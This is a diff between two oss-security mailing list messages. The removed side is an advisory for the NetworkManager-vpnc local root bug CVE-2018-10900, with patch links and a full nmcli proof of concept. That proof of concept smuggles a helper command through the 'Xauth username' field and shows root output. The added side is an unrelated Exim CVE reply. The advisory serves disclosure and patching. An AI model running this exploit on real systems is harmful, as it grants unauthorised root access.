@@ -1,61 +1,33 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/07/20/3
-Message-ID: <c3f99b35b65fa7d78317ca62f32046eab71596b9.camel@v3.sk>
-Date: Fri, 20 Jul 2018 11:38:39 +0200
-From: Lubomir Rintel <lkundrak@...sk>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/02/08/5
+Message-ID: <20180208210539.dg4mzriaow57g6sz@jumper.schlittermann.de>
+Date: Thu, 8 Feb 2018 22:05:39 +0100
+From: Heiko Schlittermann <hs@...littermann.de>
 To: oss-security@...ts.openwall.com
-Subject: CVE-2018-10900: NetworkManager-vpnc-1.2.4 local privilege escalation
+Subject: Re: Re: CVE-2018-6789 Exim 4.90 and earlier: buffer overflow
 Content-Type: text/plain; charset=utf-8
 
-Hi,
+Ian Zimmerman <itz@...y.loosely.org> (Do 08 Feb 2018 21:16:04 CET):
+…
+> <center><h1>404 Not Found</h1></center>
+Thank you.
 
-NetworkManager-vpnc-1.2.6 fixes a local authenticated root bug.
+> On 2018-02-07 11:39, Heiko Schlittermann wrote:
+> > Updates will follow. Here and on 
+> > https://exim.org/security/CVE-2018-6789.txt
 
-The bug was responsibly disclosed to us by Denis Andzakovic. Please
-credit him if you issue an advisory for a product that ships the
-affected code. His original advisory should be available soon at
-https://pulsesecurity.co.nz/advisories/NM-VPNC-Privesc
+Update:
 
-CVE Number: CVE-2018-10900
+    https://exim.org/static/doc/security/CVE-2018-6789.txt
 
-Original Report (will be available soon):
-https://pulsesecurity.co.nz/advisories/NM-VPNC-Privesc
 
-Patch:
-https://gitlab.gnome.org/GNOME/NetworkManager-vpnc/commit/07ac18a32b4
+    Best regards from Dresden/Germany
+    Viele Grüße aus Dresden
+    Heiko Schlittermann
+-- 
+ SCHLITTERMANN.de ---------------------------- internet & unix support -
+ Heiko Schlittermann, Dipl.-Ing. (TU) - {fon,fax}: +49.351.802998{1,3} -
+ gnupg encrypted messages are welcome --------------- key ID: F69376CE -
+ ! key id 7CBF764A and 972EAC9F are revoked since 2015-01 ------------ -
 
-Release Notes:
-https://download.gnome.org/sources/NetworkManager-vpnc/1.2/NetworkManager-vpnc-1.2.6.news
-
-Patched Version:
-https://download.gnome.org/sources/NetworkManager-vpnc/1.2/NetworkManager-vpnc-1.2.6.tar.xz
-
-The exploit code for QA and documentation purposes follows:
-
-cat <<EOF >/tmp/helper
-#!/bin/bash
-id >/tmp/pwned
-EOF
-chmod +x /tmp/helper
-nmcli c add con-name poc type vpn ifname '*' vpn-type vpnc \
-+vpn.data "IKE DH Group = dh2" \
-+vpn.data "IPSec ID = bar" \
-+vpn.data "IPSec gateway = 127.0.0.1" \
-+vpn.data "IPSec secret-flags = 4" \
-+vpn.data "Local Port = 0" \
-+vpn.data "NAT Traversal Mode = natt" \
-+vpn.data "Perfect Forward Secrecy = server" \
-+vpn.data "Vendor = cisco" \
-+vpn.data "Xauth password-flags = 4" \
-+vpn.data "Xauth username = foo$(echo; echo Password helper
-/tmp/helper)" \
-+vpn.data "ipsec-secret-type = save" \
-+vpn.data "xauth-password-type = save"
-nmcli c up poc
-
-$ cat /tmp/pwned
-uid=0(root) gid=0(root) groups=0(root)
-context=system_u:system_r:vpnc_t:s0
-
-Take care,
-Lubo
+Download attachment "signature.asc" of type "application/pgp-signature" (489 bytes)
